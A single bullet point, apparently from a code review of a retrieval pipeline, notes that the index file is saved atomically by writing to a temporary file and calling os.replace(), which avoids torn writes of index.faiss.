- **Atomic index persistence:** `_write_index_atomic` writes to a `.tmp` file and uses
  `os.replace()` (`rag_pipeline.py:165-169`), which is atomic on POSIX — no torn-write window for
  `index.faiss`.
